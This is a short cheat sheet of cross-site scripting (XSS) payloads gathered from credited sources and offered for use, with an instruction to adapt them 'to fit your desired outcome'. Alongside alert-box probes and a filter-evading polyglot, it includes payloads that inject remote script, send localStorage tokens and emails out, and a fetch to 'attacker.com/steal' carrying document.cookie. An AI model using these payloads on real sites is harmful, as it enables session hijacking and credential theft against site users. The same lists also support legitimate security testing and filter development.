/* The following are XSS payloads from
various sources. After recieving a pop-up box
alter the payload to fit your desired outcome */

// Bland
<sCriPt>alert("1")</ScRipt>


// High Success -- Credit: Brute Logic 
"><img src onerror=alert(1)>
"autofocus onfocus=alert(2)//
</script><script>alert(3)</script>
'-alert(4)-'
\'-alert(5)//
javascript:alert(6)


//document cookie
alert(document.cookie)


// Polyglot -- Credit: 0xSobky/HackVault 
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3e


// Payloads
<img src=1 onerror=alert(decodeURIComponent("URL Encoded String"))>
<img src=1 onerror="document.head.appendChild(document.createElement('script')).src='http://127.0.0.1/script.js'">
<img src=1 onerror="document.head.appendChild(document.createElement('script')).src=’http://127.0.0.1/script.js?c='+localStorage.token + localStorage.email">
  
// DoM - this is client-side XSS within the browser executing the JavaScript. 
' onerror='alert()'

https://example.com/page?input=<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>

